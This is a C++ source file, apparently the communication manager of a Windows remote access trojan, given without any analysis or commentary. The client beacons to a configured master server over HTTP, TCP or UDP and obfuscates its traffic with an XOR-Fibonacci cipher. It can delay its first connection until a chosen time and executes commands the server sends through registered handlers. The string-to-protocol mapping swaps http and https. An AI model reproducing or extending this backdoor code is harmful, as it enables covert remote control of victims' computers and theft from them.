#include "stdafx.h"
#include "env/Wow64.h"
#include "HttpComm.h"
#include "TcpComm.h"
#include "UdpComm.h"
#include "common.h"
#include "Manager.h"
#include "CommManager.h"

CommManager::CommManager()
	: m_defaultCommName(COMMNAME_DEFAULT)
	, m_bConnected(TRUE)
{

}

CommManager::~CommManager()
{

}

BOOL CommManager::Init()
{
	ZeroMemory(m_commList, sizeof(m_commList));
	ZeroMemory(m_commAvailableList, sizeof(m_commAvailableList));

	m_commList[COMMNAME_HTTP] = new HttpComm;
	m_commList[COMMNAME_HTTPS] = new HttpComm(TRUE);
	m_commList[COMMNAME_TCP] = new TcpComm;
//	m_commList[COMMNAME_TCPS] = new TcpComm(TRUE);
	m_commList[COMMNAME_UDP] = new UdpComm;
//	m_commList[COMMNAME_UDPS] = new UdpComm(TRUE);

	m_hExitEvent = ::CreateEvent(NULL, FALSE, FALSE, NULL);
	if (! m_hExitEvent.IsValid())
	{
		errorLogE(_T("create exitevent failed."));
		return FALSE;
	}
	m_dwMsgIntervalMS = 500;
	
	if (! Manager::GetInstanceRef().Init())
	{
		errorLog(_T("init servant manager failed"));
		return FALSE;
	}

	m_clientid = Manager::GetInstanceRef().GetClientID();

	return TRUE;
}

void CommManager::Deinit()
{
	m_bWorking = FALSE;
	::SetEvent(m_hExitEvent);
//	m_messageSenderThread.Terminate();
	//	m_messageSenderThread.WaitForEnd(5000);

	for (int i = COMMNAME_DEFAULT + 1; i < COMMNAME_MAX; i++)
	{
		if (NULL != m_commList[i])
		{
			delete m_commList[i];
			m_commList[i] = NULL;
		}
	}
}

BOOL CommManager::Send( COMM_NAME commName, ULONG targetIP, const LPBYTE pData, DWORD dwSize )
{
	if (NULL == m_commList[commName]) return FALSE;

	ByteBuffer buffer;
	buffer.Alloc(dwSize);

	XorFibonacciCrypt(pData, dwSize, (LPVOID)(LPBYTE)buffer, 2, 7);

	BOOL ret = m_commList[commName]->Send(targetIP, (LPBYTE)buffer, dwSize);

	return ret;
}

BOOL CommManager::SendAndRecv( COMM_NAME commName, ULONG targetIP, const LPBYTE pSendData, DWORD dwSendSize, ByteBuffer& recvData )
{
	if (NULL == m_commList[commName]) return FALSE;

	ByteBuffer sendBuffer;
	sendBuffer.Alloc(dwSendSize);
	XorFibonacciCrypt(pSendData, dwSendSize, (LPVOID)(LPBYTE)sendBuffer, 2, 7);

	LPBYTE pRecvData = NULL;
	DWORD dwRecvSize = 0;
	BOOL bRet = m_commList[commName]->SendAndRecv(targetIP, (LPBYTE)sendBuffer, dwSendSize, &pRecvData, dwRecvSize);

	if (! bRet) 
	{
		errorLog(_T("send and recv[%d] failed"), commName);
		return FALSE;
	}

	if (dwRecvSize > 0)
	{
		bRet = TRUE;
		recvData.Alloc(dwRecvSize);
		XorFibonacciCrypt(pRecvData, dwRecvSize, (LPVOID)(LPBYTE)recvData, 2, 7);

		m_commList[commName]->FreeRecvData(pRecvData);
	}

	return bRet;
}

DWORD WINAPI CommManager::CmdExcutor( LPVOID lpParameter )
{
	Wow64FsRedirectionDisabler disabler;
	disabler.Disable();

	PEXECUTOR_PARAMETER p = (PEXECUTOR_PARAMETER) lpParameter;

	p->fnCallback(p->msgid, p->data, p->data.Size(), p->lpParameter);

	delete p;

	return 0;
}

BOOL CommManager::PushMsgToMaster( COMM_NAME commName, CommData& data )
{
	BOOL ret = FALSE;

	if (NULL == m_commList[commName]) return FALSE;

	//将消息序列化为byteData
	ByteBuffer byteData;

	data.SetClientID(m_clientid.c_str());

	data.Serialize(byteData);

	m_cspd.Enter();

	m_pd.push_back(byteData);

	m_cspd.Leave();

	return ret;
}

BOOL CommManager::IsCommAvailable( COMM_NAME commName ) const
{
	return (commName >= COMMNAME_DEFAULT && commName < COMMNAME_MAX && NULL != m_commList[commName]);
}

BOOL CommManager::IsConnected() const
{
	return m_bConnected;
}

void CommManager::SetDefaultComm( COMM_NAME commName )
{
	m_defaultCommName = commName;
	m_commList[COMMNAME_DEFAULT] = m_commList[commName];
	debugLog(_T("SET DEFAULT COMM : %u"), m_defaultCommName);
}

COMM_NAME CommManager::GetDefaultComm() const
{
	return m_defaultCommName;
}

BOOL CommManager::Str2Commname( LPCTSTR str, COMM_NAME& commName ) const
{
	commName = COMMNAME_MAX;
	if (_tcscmp(str, _T("http")) == 0)
	{
		commName = COMMNAME_HTTPS;
	}
	else if (_tcscmp(str, _T("https")) == 0)
	{
		commName = COMMNAME_HTTP;
	}
	else if (_tcscmp(str, _T("tcp")) == 0)
	{
		commName = COMMNAME_TCP;
	}
	else if (_tcscmp(str, _T("tcps")) == 0)
	{
		commName = COMMNAME_TCP;
	}
	else if (_tcscmp(str, _T("udp")) == 0)
	{
		commName = COMMNAME_UDP;
	}
	else if (_tcscmp(str, _T("udps")) == 0)
	{
		commName = COMMNAME_UDP;
	}


	return (COMMNAME_MAX != commName);
}

BOOL CommManager::Commname2Str( COMM_NAME commName, tstring& str ) const
{
	switch (commName)
	{
	case COMMNAME_HTTP:
		str = _T("http");
		break;
	case COMMNAME_HTTPS:
		str = _T("https");
		break;
	case COMMNAME_TCP:
		str = _T("tcp");
		break;
	case COMMNAME_TCPS:
		str = _T("tcps");
		break;
	case COMMNAME_UDP:
		str = _T("udp");
		break;
	case COMMNAME_UDPS:
		str = _T("udps");
		break;
	default:
		str = _T("invalid");
		return FALSE;
	}

	return TRUE;
}

BOOL CommManager::StartMessageWorker( ULONG testIntervalMS, DWORD dwSendIntervalMS /*= 2000*/, DWORD dwMaxNoDataTimeMS )
{
	if (m_messageSenderThread.IsRunning()) return FALSE;

	m_bWorking = TRUE;
	m_dwMsgIntervalMS = dwSendIntervalMS;

//	if (! IsCommAvailable(COMMNAME_DEFAULT))/* SendCommTestMessages()*/;

	return m_messageSenderThread.Start(MessageSender, this);
}

void CommManager::SetConfig( DWORD testIntervalMS, DWORD dwMaxNoDataTimeMS )
{
}

void CommManager::CreateEmptyPacket(ByteBuffer& buffer)
{
	CommData data;
	data.SetClientID(m_clientid.c_str());
	data.SetMsgID(MSGID_AVAILABLE_COMM);

	data.Serialize(buffer);
}

BOOL CommManager::GetMessageToSend( COMM_NAME& name,ByteBuffer& buffer )
{
	BOOL ret = FALSE;

	name = COMMNAME_DEFAULT;

	m_cspd.Enter();

	if ( m_pd.size() != 0 )
	{
		buffer = m_pd.front();
		m_pd.pop_front();
		ret = TRUE;
	}

	m_cspd.Leave();

	return ret;
}

DWORD WINAPI CommManager::MessageSender( LPVOID lpParameter )
{
	CommManager* pMgr = (CommManager*) lpParameter;
	pMgr->MessageSenderProc();
	return 0;
}

void CommManager::MessageSenderProc()
{
	Wow64FsRedirectionDisabler disabler;
	disabler.Disable();

	DWORD sendTestTimeMS = 0;

	BOOL bFirstConnect = TRUE;
	BOOL bWaitUntil = (g_ConfigInfo.nFirstConnectHour >= 0 && g_ConfigInfo.nFirstConnectMinute >= 0);

	ByteBuffer recvByteData;

	while (m_bWorking)
	{
		if (! m_bWorking) break;

		Sleep(m_dwMsgIntervalMS);

		//如果配置了第一次上线时间,则需要检测并等待
		if (bFirstConnect && bWaitUntil)
		{
			static int iCount = 0;
			iCount++;
			if (iCount < 5) continue;
			
			iCount = 0;
			SYSTEMTIME now;
			::GetLocalTime(&now);
			if (now.wHour == g_ConfigInfo.nFirstConnectHour && now.wMinute == g_ConfigInfo.nFirstConnectMinute)
			{
				bFirstConnect = FALSE;
			}
			else
			{
				continue;
			}
		}

		//从CutupProtocol获取待发送数据
		ByteBuffer toSendByteData;
		COMM_NAME commName;

		if (! GetMessageToSend(  commName ,toSendByteData))
		{
			CreateEmptyPacket(toSendByteData);
			commName = COMMNAME_DEFAULT;
		}

		ULONG targetIP = 0;

		BOOL ret = FALSE;

		do 
		{
			ret = MySocket::IPOrHostname2IP(a2t(g_ConfigInfo.szAddr),targetIP);

		} while (!ret);
		

		ret = SendAndRecv(commName, targetIP, toSendByteData, toSendByteData.Size(), recvByteData);

		if (! ret)
		{
			CmdRedirector &cmd = Manager::GetInstanceRef().m_cmdRedirector;

			if (cmd.IsChildRunning())
				cmd.Stop();

			errorLog(_T("sendrecv msg [%d] failed"), commName);

			continue;
		}
		if (!IsConnected())
		{
			ConnectedNotify();
		}

		CommData recvData;

		ret = recvData.Parse(recvByteData, recvByteData.Size());

		if (!ret  )
		{
			errorLog(_T("parse received msg failed"));
			continue;
		}

		MSGID msgid = recvData.GetMsgID();
		if (INVALID_MSGID == msgid)
		{
			continue;
		}

		if ( MSGID_AVAILABLE_COMM == msgid )
		{
			continue;
		}

		//查询消息处理者
		FnExecuteRCCommand fnCallback = NULL;
		LPVOID lpParameter = NULL;
		if (! Manager::GetInstanceRef().QueryCommandHandler(msgid, &fnCallback, &lpParameter)
			|| NULL == fnCallback )
		{
			errorLog(_T("no handler for [%I64u]"), msgid);
			CommData reply;
			reply.Reply(recvData);
			reply.SetMsgID(MSGID_REPLY_COMMAND);
			reply.SetData(_T("error"), _T("invalid command"));
			PushMsgToMaster(commName, reply);

			continue;
		}

		debugLog(_T("recv msgid[%I64u]. try to handle it"), msgid);

		//使用线程池处理，或者直接处理
		if (recvData.UsingPoolThread())
		{
			PEXECUTOR_PARAMETER p = new EXECUTOR_PARAMETER;
			p->msgid = msgid;
			p->fnCallback = fnCallback;
			p->lpParameter = lpParameter;
			recvData.Serialize(p->data);

			::QueueUserWorkItem(CmdExcutor, p, WT_EXECUTEDEFAULT);
		}
		else
		{
			ByteBuffer dataBuffer;
			recvData.Serialize(dataBuffer);
			fnCallback(msgid, dataBuffer, dataBuffer.Size(), lpParameter);
		}
	}
}

void CommManager::DisconnectedNotify()
{
#ifdef _DEBUG
	SetConfig(1000 * 30, 1000 * 30);
#else
	SetConfig(1000 * 60 * 30, g_ConfigInfo.nTryConnectIntervalM * 60 * 1000);
#endif
	::InterlockedExchange(&m_bConnected, FALSE);
	debugLog(_T("DISCONNECTED"));
}

void CommManager::ConnectedNotify()
{
	SetConfig(1000 * 30, 1000);
	::InterlockedExchange(&m_bConnected, TRUE);
	debugLog(_T("CONNECTED"));
}
